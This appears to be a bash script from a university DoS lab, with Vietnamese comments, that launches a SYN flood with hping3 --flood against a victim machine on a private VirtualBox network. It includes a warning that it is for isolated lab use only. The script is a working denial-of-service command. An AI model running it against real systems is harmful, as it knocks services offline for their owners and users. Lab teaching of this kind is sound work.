#!/bin/bash
# ==============================================================
# SYN Flood simulation — CMU-CS 376 DoS/DDoS Lab
# CHẠY TRÊN: Kali Linux (Attacker) — 192.168.100.10
# MỤC TIÊU: Windows (Victim) — 192.168.100.20:8000
#
# CẢNH BÁO: Chỉ chạy trong môi trường VirtualBox Internal Network
# cô lập ("intnet-lab"). Không sử dụng ngoài mục đích học tập.
# ==============================================================

TARGET_IP="192.168.100.20"
TARGET_PORT=8000

echo "[*] Bắt đầu SYN Flood tới ${TARGET_IP}:${TARGET_PORT}"
echo "[*] Nhấn Ctrl+C để dừng"

# -S     : gửi gói tin với cờ SYN (khởi tạo bắt tay TCP nhưng không hoàn tất)
# -p     : cổng đích (8000 — cổng Python HTTP Server trên máy victim)
# --flood: gửi gói tin với tốc độ tối đa có thể, không đợi phản hồi
sudo hping3 -S -p ${TARGET_PORT} --flood ${TARGET_IP}
